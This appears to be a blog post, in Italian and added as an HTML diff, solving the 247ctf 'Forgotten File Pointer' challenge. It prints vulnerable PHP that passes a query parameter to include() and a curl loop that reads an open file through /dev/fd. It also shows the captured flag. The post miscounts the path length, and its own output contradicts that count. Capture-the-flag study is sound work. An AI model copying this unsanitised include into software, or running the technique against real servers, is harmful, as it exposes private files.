@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Forgotten File Pointer - WEB Platform: 247ctf Difficoltà: Moderate (Relativo alla piattaforma) Link: https://247ctf.com/ Descrizione We have opened the flag, but forgot to read and print it. Can you access it anyway? In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.
+&lt;?php $fp = fopen(&#34;/tmp/flag.txt&#34;, &#34;r&#34;); if($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39; &amp;&amp; isset($_GET[&#39;include&#39;]) &amp;&amp; strlen($_GET[&#39;include&#39;]) &lt;= 10) { include($_GET[&#39;include&#39;]); } fclose($fp); echo highlight_file(__FILE__, true); ?">  
+
+  <title>
+    
+      247ctf Forgotten File Pointer
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9a52a4ee12d1188ebf087e7e00537228e46636a98704dadaf471fe008d3c250b854681c0253f1527a9ccc533e2f6cd4355dcd709cc9781d0fa61e7f27d7a3bf2.css" integrity="sha512-mlKk7hLRGI6/CH5&#43;AFNyKORmNqmHBNra9HH&#43;AI08JQuFRoHAJT8VJ6nMxTPi9s1DVdzXCcyXgdD6YefyfXo78g==" />
+  
+</head>
+<body a="auto">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+                <div class="post-meta">
+                    <a href="/">..</a>
+
+                    <p>
+                        <time datetime="2025-10-22 21:19:07 &#43;0200 CEST">
+                            2025-10-22
+                        </time>
+                    </p>
+                </div>
+
+<article>
+    <h1>247ctf Forgotten File Pointer</h1>
+
+    
+
+    <h1 id="forgotten-file-pointer---web">Forgotten File Pointer - WEB</h1>
+<ul>
+<li><strong>Platform:</strong> 247ctf</li>
+<li><strong>Difficoltà:</strong> Moderate (Relativo alla piattaforma)</li>
+<li><strong>Link:</strong> <a href="https://247ctf.com/">https://247ctf.com/</a></li>
+</ul>
+<h2 id="descrizione">Descrizione</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>We have opened the flag, but forgot to read and print it. Can you access it anyway?
+</span></span></code></pre></div><p>In questa challenge ci viene fornito un endpoint che mostra il codice della pagina stessa e ci viene chiesto di recuperare la flag che si trova in un file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/tmp/flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;GET&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;include&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>($_GET[<span style="color:#e6db74">&#39;include&#39;</span>]) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;include&#39;</span>]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fclose</span>($fp);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Il codice è abbastanza diretto e la vulnerabilità è evidente: viene passato alla funzione <code>include()</code> direttamente il query param &lsquo;include&rsquo; senza alcun tipo di sanificazione, dobbiamo solo trovare il modo di sfruttarlo!</p>
+<h2 id="analisi">Analisi</h2>
+<p>Il file flag.txt viene aperto da PHP ma non viene mostrato direttamente. Tuttavia l&rsquo;if viene valutato prima della chiamata a <code>fclose($fp);</code>, quindi quando viene eseguita <code>include($_GET['include']);</code> il file è ancora aperto.</p>
+<p>La funzione <code>include()</code> ha la proprietà che, se le passi un semplice file di testo, ne stampa il contenuto. Basta quindi passare il nome del file che vogliamo leggere ovvero <code>/tmp/flag.txt</code> e il gioco è fatto.</p>
+<p>Il problema è che l&rsquo;if controlla la lunghezza del parametro: <code>include($_GET['include']);</code> viene eseguito solo se la stringa non supera i 10 caratteri.</p>
+<h2 id="soluzione">Soluzione</h2>
+<p>Per poter accedere ai file aperti dal processo possiamo rifarci a <code>/dev/fd</code>.</p>
+<p><code>/dev/fd</code> è una directory virtuale in Linux che contiene i file descriptor del processo in esecuzione.</p>
+<p>In pratica, è un modo per accedere agli stream aperti (stdin, stdout, stderr, socket, file, pipe, ecc.) come se fossero normali file nel filesystem. Ogni &ldquo;file&rdquo; all&rsquo;interno della directory rappresenta un file descriptor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/dev/fd/0 -&gt; stdin  
+</span></span><span style="display:flex;"><span>/dev/fd/1 -&gt; stdout  
+</span></span><span style="display:flex;"><span>/dev/fd/2 -&gt; stderr  
+</span></span><span style="display:flex;"><span>/dev/fd/3, /dev/fd/4, … -&gt; altri file aperti
+</span></span></code></pre></div><p>Nel nostro caso dal momento che <code>/dev/fd/</code> è di 9 caratteri possiamo accedere direttamente ai file <code>/dev/fd/X</code> dove X è compreso tra 0 a 9, quindi i file descriptor di 1 cifra. A questo punto possiamo provarli tutti facilmente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>0..10<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> curl https://97f0352ee0639764.247ctf.com?include<span style="color:#f92672">=</span>/dev/fd/$i -s | grep 247CTF<span style="color:#f92672">{</span> <span style="color:#f92672">&amp;&amp;</span> echo $i -s ; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Attraverso un ciclo for andiamo ad eseguire curl e ricerchiamo la stringa <code>247CTF{</code>. Dopo qualche secondo, abbiamo la flag!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>maimba@Saturn:~/$ <span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>0..10<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> curl https://97f0352ee0639764.247ctf.com?include<span style="color:#f92672">=</span>/dev/fd/$i -s | grep 247CTF<span style="color:#f92672">{</span> <span style="color:#f92672">&amp;&amp;</span> echo $i -s ; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>247CTF<span style="color:#f92672">{</span>4be4e08685e2ed433dde9171e887761e<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span> -s
+</span></span></code></pre></div>
+</article>
+
+            </div>
+        </main>
+    </body></html>
